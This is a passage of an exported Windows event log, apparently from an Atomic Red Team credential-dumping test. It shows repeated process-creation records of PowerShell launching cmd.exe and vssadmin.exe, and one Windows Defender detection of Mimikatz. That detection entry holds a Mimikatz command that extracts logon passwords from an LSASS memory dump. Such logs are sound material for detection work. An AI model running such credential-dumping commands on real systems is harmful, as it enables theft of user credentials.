	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x15e8
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x5a0
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1324
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xf48
	New Process Name:	C:\Windows\System32\cmd.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x3c4
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
Warning,15/04/2020 20:07,Microsoft-Windows-Windows Defender,1116,None,"Windows Defender Antivirus has detected malware or other potentially unwanted software.
 For more information please see the following:
https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32/Mimikatz.I&threatid=2147741009&enterprise=0
 	Name: HackTool:Win32/Mimikatz.I
 	ID: 2147741009
 	Severity: High
 	Category: Tool
 	Path: CmdLine:_C:\Windows\System32\cmd.exe /c ATOMICS_T1003_mimikatz_EXECUTABLE sekurlsa::minidump LSAAS_DMP sekurlsa::logonpasswords full exit
 	Detection Origin: Unknown
 	Detection Type: Concrete
 	Detection Source: System
 	User: NT AUTHORITY\SYSTEM
 	Process Name: Unknown
 	Security intelligence Version: AV: 1.313.1512.0, AS: 1.313.1512.0, NIS: 1.313.1512.0
 	Engine Version: AM: 1.1.16900.4, NIS: 1.1.16900.4"
Information,15/04/2020 20:07,Microsoft-Windows-Security-Auditing,4688,Process Creation,"A new process has been created.

Creator Subject:
	Security ID:		DESKTOP-P8HTU4V\User
	Account Name:		User
	Account Domain:		DESKTOP-P8HTU4V
	Logon ID:		0x10344F

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1414
	New Process Name:	C:\Windows\System32\vssadmin.exe
	Token Elevation Type:	%%1938
	Mandatory Label:		Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0xf48
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."
